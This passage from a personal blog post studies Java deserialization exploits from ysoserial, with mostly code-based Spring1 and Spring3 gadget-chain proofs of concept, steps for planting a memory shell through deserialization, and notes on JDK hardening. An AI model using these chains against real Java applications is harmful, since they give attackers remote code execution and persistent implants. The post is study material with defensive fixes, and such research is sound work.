<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();  </span><br><span class="line">    <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;equals&quot;</span>)) &#123;  </span><br><span class="line">        <span class="keyword">return</span> proxy == args[<span class="number">0</span>];  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;  </span><br><span class="line">        <span class="keyword">return</span> System.identityHashCode(proxy);  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;toString&quot;</span>)) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.objectFactory.toString();  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.objectFactory.getObject(), args);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> var6.getTargetException();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The invocation will be delegated to the object returned by <code>objectFactory</code>. We can create an <code>ObjectFactory</code> proxy and hook <code>getObject()</code> method for returning <code>TemplatesImpl</code>.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">final</span> <span class="type">ObjectFactory</span> <span class="variable">objectFactoryProxy</span> <span class="operator">=</span>  </span><br><span class="line">      Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="string">&quot;getObject&quot;</span>, templates), ObjectFactory.class);</span><br></pre></td></tr></table></figure>
<p>Equip <code>ObjectFactoryDelegatingInvocationHandler</code> with this <code>ObjectFactory</code> and create a <code>Type</code> proxy:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Type</span> <span class="variable">typeTemplatesProxy</span> <span class="operator">=</span> Gadgets.createProxy((InvocationHandler)  </span><br><span class="line">      Reflections.getFirstCtor(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>)  </span><br><span class="line">         .newInstance(objectFactoryProxy), Type.class, Templates.class);</span><br></pre></td></tr></table></figure>

<p>Build <code>TypeProvider</code> proxy to hook <code>getType()</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">typeProviderProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(  </span><br><span class="line">      Gadgets.createMap(<span class="string">&quot;getType&quot;</span>, typeTemplatesProxy),  </span><br><span class="line">      forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>Build <code>MethodInvokeTypeProvider</code> and modify <code>methodName</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Constructor</span> <span class="variable">mitpCtor</span> <span class="operator">=</span> Reflections.getFirstCtor(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);  </span><br><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">mitp</span> <span class="operator">=</span> mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod(<span class="string">&quot;getClass&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;&#125;), <span class="number">0</span>);  </span><br><span class="line">Reflections.setFieldValue(mitp, <span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> nitp;</span><br></pre></td></tr></table></figure>

<p>Whole Poc:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">final</span> <span class="type">ObjectFactory</span> <span class="variable">objectFactoryProxy</span> <span class="operator">=</span>  </span><br><span class="line">      Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="string">&quot;getObject&quot;</span>, templates), ObjectFactory.class);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">final</span> <span class="type">Type</span> <span class="variable">typeTemplatesProxy</span> <span class="operator">=</span> Gadgets.createProxy((InvocationHandler)  </span><br><span class="line">      Reflections.getFirstCtor(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>)  </span><br><span class="line">         .newInstance(objectFactoryProxy), Type.class, Templates.class);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">typeProviderProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(  </span><br><span class="line">      Gadgets.createMap(<span class="string">&quot;getType&quot;</span>, typeTemplatesProxy),  </span><br><span class="line">      forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>));  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">final</span> <span class="type">Constructor</span> <span class="variable">mitpCtor</span> <span class="operator">=</span> Reflections.getFirstCtor(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);  </span><br><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">mitp</span> <span class="operator">=</span> mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod(<span class="string">&quot;getClass&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;&#125;), <span class="number">0</span>);  </span><br><span class="line">Reflections.setFieldValue(mitp, <span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">return</span> mitp;</span><br></pre></td></tr></table></figure>

<h3 id="Spring3"><a href="#Spring3" class="headerlink" title="Spring3"></a>Spring3</h3><blockquote>
<p>[!NOTE] pre-requirements<br>Reproduced on JDK1.8<br>org.springframework:spring-tx:5.2.3.RELEASE<br>org.springframework:spring-context:5.2.3.RELEASE<br>javax.transaction:javax.transaction-api:1.2</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Gadget chain</span></span><br><span class="line">lookup:<span class="number">179</span>, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookupUserTransaction:<span class="number">571</span>, JtaTransactionManager (org.springframework.transaction.jta)</span><br><span class="line">initUserTransactionAndTransactionManager:<span class="number">448</span>, JtaTransactionManager (org.springframework.transaction.jta)</span><br><span class="line">readObject:<span class="number">1206</span>, JtaTransactionManager (org.springframework.transaction.jta)</span><br></pre></td></tr></table></figure>

<p><code>JtaTransactionManager</code> class will look up JNDI URL stored in <code>userTransactionName</code> when deserializing.<br>This vul is quite simple without needing to analyze.<br>Poc:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jndiURL</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line"><span class="keyword">if</span> (command.toLowerCase().startsWith(<span class="string">&quot;jndi:&quot;</span>)) &#123;  </span><br><span class="line">   jndiURL = command.substring(<span class="number">5</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">JtaTransactionManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JtaTransactionManager</span>();  </span><br><span class="line">manager.setUserTransactionName(jndiURL);  </span><br><span class="line"><span class="keyword">return</span> manager;</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><h2 id="Insert-memory-shell-through-deserialization-vulnerability"><a href="#Insert-memory-shell-through-deserialization-vulnerability" class="headerlink" title="Insert memory shell through deserialization vulnerability"></a>Insert memory shell through deserialization vulnerability</h2><ol>
<li>Create a memory shell class(e.g. <code>EvilFilter</code>) and override the required method</li>
<li>Write code for inserting memory shell in a static code block of a certain class(normally the memory shell class itself)</li>
<li>Select a script engine(JavaScript, BeanShell, Python, etc.). Prepare the script code in which define an evil class to insert memory shell and create a new instance to trigger the static code block</li>
<li>Execute script through deserialization vulnerability.</li>
</ol>
<hr>
<h2 id="Fixes"><a href="#Fixes" class="headerlink" title="Fixes"></a>Fixes</h2><h3 id="JDK-fixes"><a href="#JDK-fixes" class="headerlink" title="JDK fixes"></a>JDK fixes</h3><h4 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h4><p>This article[^1] introduces security updates for serialization in JDK1.8. In summary, there are three strengthening methods introduced in JDK1.8:</p>
<ol>
<li>Override <code>ObjectInputStream</code>‘s <code>resolveClass</code> or <code>resolveProxyClass</code> method</li>
<li>Use <code>ValidatingObjectInputStream</code> to decorate <code>ObjectInputStream</code> to deploy white-list validation</li>
<li>Create an <code>ObjectInputFilter</code> class overriding <code>checkInput</code> method, and decorate an <code>ObjectInputStream</code> via <code>setObjectInputFilter</code> method.</li>
</ol>
<h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a><code>AnnotationInvocationHandler</code></h4><p>Recall [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections1|the exploitation of CC1]], there are two handlers employed, one with a dynamic proxy as <code>memberValues</code>(i.e. outer handler) and another which is a member of the proxy object with a <code>LazyMap</code> as <code>memberValues</code>(i.e. inner handler). While deserialize, it comes in a depth-prior recursion, so the inner handler would be firstly deserialized, after all fields finish deserialization here comes to deserializing the proxy, later the outer handler.<br>Let’s take a look at the <code>AnnotationInvocationHandler</code>‘s <code>readObject</code> in JDK1.8:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span>  </span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;  </span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  </span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; t = (Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt;)fields.get(<span class="string">&quot;type&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  </span><br><span class="line">    Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly  </span></span><br><span class="line">  </span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        annotationType = AnnotationType.getInstance(t);  </span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;  </span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out  </span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();  </span><br><span class="line">    <span class="comment">// consistent with runtime Map type  </span></span><br><span class="line">    Map&lt;String, Object&gt; mv = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// If there are annotation members without values, that  </span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.    for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);  </span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists  </span></span><br><span class="line">            value = memberValue.getValue();  </span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||  </span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;  </span><br><span class="line">                value = <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(  </span><br><span class="line">                            objectToString(value))  </span><br><span class="line">                    .setMember(annotationType.members().get(name));  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        mv.put(name, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    UnsafeAccessor.setType(<span class="built_in">this</span>, t);  </span><br><span class="line">    UnsafeAccessor.setMemberValues(<span class="built_in">this</span>, mv);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The key action falls in the local variable <code>mv</code>, now <code>readObject</code> will always set the <code>memberValue</code> to <code>LinkedHashMap</code> whatever its type deserialized. So the <code>LazyMap</code> in our CC1 would not be effective.</p>
<hr>
<h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><hr>
<h2 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h2><h3 id="How-to-test-Poc-Do-not-debug"><a href="#How-to-test-Poc-Do-not-debug" class="headerlink" title="How to test Poc? Do not debug!"></a>How to test Poc? Do not debug!</h3><p>IDEA debugger could ignite the key RCE code point, which will lead to confusion like: why does calculator start even before reaching the RCE code? The picture below is an proof that the debugger would call functions of current objects.<br>![[Pasted image 20231008160842.png]]</p>
<hr>
<h2 id="Journal"><a href="#Journal" class="headerlink" title="Journal"></a>Journal</h2><ul>
<li><input checked="" disabled="" type="checkbox"> CC8 not worked</li>
</ul>
<hr>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[^1]: <a target="_blank" rel="noopener" href="https://github.com/Cryin/Paper/blob/master/%E6%B5%85%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88.md">Paper&#x2F;浅谈Java反序列化漏洞修复方案.md at master · Cryin&#x2F;Paper</a></p>

      </div>
      <div class="post-copyright">
    <p class="copyright-item">
      <span>Author: </span>
      <a href="http://padishah.github.io">Padishah</a>
    </p>
    <p class="copyright-item">
      <span>Link: </span>
      <a href="http://padishah.github.io/2023/10/24/Pentest/Java%20Deserialize%20Vulnerabilities%20ysoserial%20study/">http://padishah.github.io/2023/10/24/Pentest/Java%20Deserialize%20Vulnerabilities%20ysoserial%20study/</a>
    </p>
    <p class="copyright-item">
      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
    </p>
  </div>
      <footer class="post-footer">
        
        <nav class="post-nav"><a class="next" href="/2023/10/24/Pentest/Memshell%20study%20JNDI%20inject%20memshell%20JNDI%20exploit%20tool%20development/">
        <span class="next-text nav-default">Memshell study, JNDI inject memshell, JNDI exploit tool development</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></footer>
    </article></div><div class="comments" id="comments"></div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:350717997@qq.com" class="iconfont icon-email" title="email"></a>
        <a target="_blank" rel="noopener" href="https://github.com/PadishahIII" class="iconfont icon-github" title="github"></a>
        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">&copy;2023/10/24 - 2023<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">Padishah</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/src/even.js?v=2.11.2"></script>
</body>
</html>
